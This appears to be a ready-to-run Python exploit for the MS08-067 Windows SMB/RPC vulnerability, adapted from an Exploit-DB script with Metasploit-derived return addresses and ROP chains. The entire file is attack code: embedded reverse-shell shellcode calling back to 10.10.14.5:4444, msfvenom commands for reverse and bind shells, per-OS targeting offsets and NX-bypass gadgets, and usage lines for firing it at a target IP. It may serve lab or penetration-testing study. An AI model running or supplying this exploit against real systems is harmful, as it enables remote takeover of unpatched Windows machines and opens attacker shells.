#!/usr/bin/env python
import struct
import time
import sys
from threading import Thread  # Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    #from impacket.dcerpc import dcerpc
    from impacket.dcerpc.v5 import transport

except ImportError:
    print('Install the following library to make this script work')
    print('Impacket : https://github.com/CoreSecurity/impacket.git')
    print('PyCrypto : https://pypi.python.org/pypi/pycrypto')
    sys.exit(1)

print ('#######################################################################')
print ('#   MS08-067 Exploit')
print ('#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).')
print ('#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi')
print ('#')
print ('#   Mod in 2018 by Andy Acer')
print ('#   - Added support for selecting a target port at the command line.')
print ('#   - Changed library calls to allow for establishing a NetBIOS session for SMB transport')
print ('#   - Changed shellcode handling to allow for variable length shellcode.')
print ('#######################################################################\n')

print ('''
$   This version requires the Python Impacket library version to 0_9_17 or newer.
$
$   Here's how to upgrade if necessary:
$
$   git clone --branch impacket_0_9_17 --single-branch https://github.com/CoreSecurity/impacket/
$   cd impacket
$   pip install .

''')

print('#######################################################################\n')


# ------------------------------------------------------------------------
# REPLACE THIS SHELLCODE with shellcode generated for your use
# Note that length checking logic follows this section, so there's no need to count bytes or bother with NOPS.
#
# Example msfvenom commands to generate shellcode:
# msfvenom -p windows/shell_bind_tcp RHOST=10.11.1.229 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.157 LPORT=62000 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows

# Reverse TCP to 10.10.14.5 port 4444:
shellcode =  b""
shellcode += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x92\xed\xd6\xbe\x83\xee\xfc"
shellcode += b"\xe2\xf4\x6e\x05\x54\xbe\x92\xed\xb6\x37\x77"
shellcode += b"\xdc\x16\xda\x19\xbd\xe6\x35\xc0\xe1\x5d\xec"
shellcode += b"\x86\x66\xa4\x96\x9d\x5a\x9c\x98\xa3\x12\x7a"
shellcode += b"\x82\xf3\x91\xd4\x92\xb2\x2c\x19\xb3\x93\x2a"
shellcode += b"\x34\x4c\xc0\xba\x5d\xec\x82\x66\x9c\x82\x19"
shellcode += b"\xa1\xc7\xc6\x71\xa5\xd7\x6f\xc3\x66\x8f\x9e"
shellcode += b"\x93\x3e\x5d\xf7\x8a\x0e\xec\xf7\x19\xd9\x5d"
shellcode += b"\xbf\x44\xdc\x29\x12\x53\x22\xdb\xbf\x55\xd5"
shellcode += b"\x36\xcb\x64\xee\xab\x46\xa9\x90\xf2\xcb\x76"
shellcode += b"\xb5\x5d\xe6\xb6\xec\x05\xd8\x19\xe1\x9d\x35"
shellcode += b"\xca\xf1\xd7\x6d\x19\xe9\x5d\xbf\x42\x64\x92"
shellcode += b"\x9a\xb6\xb6\x8d\xdf\xcb\xb7\x87\x41\x72\xb2"
shellcode += b"\x89\xe4\x19\xff\x3d\x33\xcf\x85\xe5\x8c\x92"
shellcode += b"\xed\xbe\xc9\xe1\xdf\x89\xea\xfa\xa1\xa1\x98"
shellcode += b"\x95\x12\x03\x06\x02\xec\xd6\xbe\xbb\x29\x82"
shellcode += b"\xee\xfa\xc4\x56\xd5\x92\x12\x03\xee\xc2\xbd"
shellcode += b"\x86\xfe\xc2\xad\x86\xd6\x78\xe2\x09\x5e\x6d"
shellcode += b"\x38\x41\xd4\x97\x85\xdc\xb4\x9c\xe8\xbe\xbc"
shellcode += b"\x92\xfc\x8a\x37\x74\x87\xc6\xe8\xc5\x85\x4f"
shellcode += b"\x1b\xe6\x8c\x29\x6b\x17\x2d\xa2\xb2\x6d\xa3"
shellcode += b"\xde\xcb\x7e\x85\x26\x0b\x30\xbb\x29\x6b\xfa"
shellcode += b"\x8e\xbb\xda\x92\x64\x35\xe9\xc5\xba\xe7\x48"
shellcode += b"\xf8\xff\x8f\xe8\x70\x10\xb0\x79\xd6\xc9\xea"
shellcode += b"\xbf\x93\x60\x92\x9a\x82\x2b\xd6\xfa\xc6\xbd"
shellcode += b"\x80\xe8\xc4\xab\x80\xf0\xc4\xbb\x85\xe8\xfa"
shellcode += b"\x94\x1a\x81\x14\x12\x03\x37\x72\xa3\x80\xf8"
shellcode += b"\x6d\xdd\xbe\xb6\x15\xf0\xb6\x41\x47\x56\x36"
shellcode += b"\xa3\xb8\xe7\xbe\x18\x07\x50\x4b\x41\x47\xd1"
shellcode += b"\xd0\xc2\x98\x6d\x2d\x5e\xe7\xe8\x6d\xf9\x81"
shellcode += b"\x9f\xb9\xd4\x92\xbe\x29\x6b"
# ------------------------------------------------------------------------

# Gotta make No-Ops (NOPS) + shellcode = 410 bytes
num_nops = 410 - len(shellcode)
newshellcode = "\x90" * num_nops
newshellcode += shellcode  # Add NOPS to the front
shellcode = newshellcode   # Switcheroo with the newshellcode temp variable

#print "Shellcode length: %s\n\n" % len(shellcode)

nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + \
    "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "A" * \
    28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01";
module_base = 0x6f880000


def generate_rop(rvas):
    gadget1 = "\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
    gadget3 = "\xcc\x90\xeb\x5a"
    ret = struct.pack('<L', 0x00018000)
    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('<L', 0x01040110)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L',
                       rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget1
    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget2[0]
    ret += gadget2[1]
    ret += struct.pack('<L', rvas[
                       'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget2[2]
    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget3
    return ret


class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()

        # MODIFIED HERE
        # Changed __port to port ... not sure if that does anything. I'm a newb.
        self.port = port
        self.target = target
        self.os = os

    def __DCEPacket(self):
        if (self.os == '1'):
            print('Windows XP SP0/SP1 Universal\n')
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print('Windows 2000 Universal\n')
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print('Windows 2003 SP0 Universal\n')
            ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print('Windows 2003 SP1 English\n')
            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print('Windows XP SP3 French (NX)\n')
            ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
            disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print('Windows XP SP3 English (NX)\n')
            ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
            disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print('Windows XP SP3 English (AlwaysOn NX)\n')
            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets) + "AB"
        else:
            print('Not supported OS version\n')
            sys.exit(-1)

        print('[-]Initiating connection')

        # MORE MODIFICATIONS HERE #############################################################################################

        if (self.port == '445'):
            self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        else:
            # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters. Calling directly here.
            # *SMBSERVER is used to force the library to query the server for its NetBIOS name and use that to 
            #   establish a NetBIOS Session.  The NetBIOS session shows as NBSS in Wireshark.

            self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\browser' )
        
        self.__trans.connect()
        print('[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(
            ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        path = "\x5c\x00" + "ABCDEFGHIJ" * 10 + shellcode + "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + \
            "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + "\x00" * 2
        server = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        
        # NEW HOTNESS
        # The Path Length and the "Actual Count" SMB parameter have to match.  Path length in bytes
        #   is double the ActualCount field.  MaxCount also seems to match.  These fields in the SMB protocol
        #   store hex values in reverse byte order.  So: 36 01 00 00  => 00 00 01 36 => 310.  No idea why it's "doubled"
        #   from 310 to 620.  620 = 410 shellcode + extra stuff in the path.
        MaxCount = "\x36\x01\x00\x00"  # Decimal 310. => Path length of 620.
        Offset = "\x00\x00\x00\x00"
        ActualCount = "\x36\x01\x00\x00" # Decimal 310. => Path length of 620

        self.__stub = server + MaxCount + Offset + ActualCount + \
            path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"        

        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(3)
        print('Exploit finish\n')

if __name__ == '__main__':
       try:
           target = sys.argv[1]
           os = sys.argv[2]
           port = sys.argv[3]
       except IndexError:
                print('\nUsage: %s <target ip> <os #> <Port #>\n' % sys.argv[0])
                print('Example: MS08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445')
                print('Example: MS08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)')
                print('Example: MS08_067_2018.py 192.168.1.1 3 445 -- for Windows 2003 SP0 Universal')
                print('Example: MS08_067_2018.py 192.168.1.1 4 445 -- for Windows 2003 SP1 English')
                print('Example: MS08_067_2018.py 192.168.1.1 5 445 -- for Windows XP SP3 French (NX)')
                print('Example: MS08_067_2018.py 192.168.1.1 6 445 -- for Windows XP SP3 English (NX)')
                print('Example: MS08_067_2018.py 192.168.1.1 7 445 -- for Windows XP SP3 English (AlwaysOn NX)')
                print('')
                print('FYI: nmap has a good OS discovery script that pairs well with this exploit:')
                print('nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 192.168.1.1')
                print('')
                sys.exit(-1)


current = SRVSVC_Exploit(target, os, port)
current.start()
